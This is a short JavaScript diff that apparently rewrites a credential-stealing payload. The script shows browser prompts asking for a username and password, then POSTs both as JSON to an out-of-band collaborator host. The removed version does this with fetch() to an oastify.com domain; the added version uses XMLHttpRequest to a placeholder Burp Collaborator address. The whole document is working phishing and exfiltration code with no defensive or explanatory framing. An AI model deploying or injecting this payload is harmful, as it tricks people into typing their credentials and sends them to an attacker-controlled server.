@@ -1,15 +1,17 @@
 let username = prompt("Enter your username:");
 let password = prompt("Enter your password:");
-let collaboratorUrl = "http://yqs33nktmf2o7tx1r94hspj7yy4qsgg5.oastify.com";
-fetch(`${collaboratorUrl}/creds`, {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-        username: username,
-        password: password
-    })
-})
-.then(response => console.log('Credentials sent successfully:', response))
-.catch(error => console.error('Error sending credentials:', error));
+let collaboratorUrl = "http://<your-burp-collaborator-id>.burpcollaborator.net";
+let xhr = new XMLHttpRequest();
+xhr.open("POST", collaboratorUrl + "/creds", true);
+xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+        console.log("Credentials sent successfully!");
+    } else if (xhr.readyState === 4) {
+        console.error("Error sending credentials:", xhr.statusText);
+    }
+};
+xhr.send(JSON.stringify({
+    username: username,
+    password: password
+}));
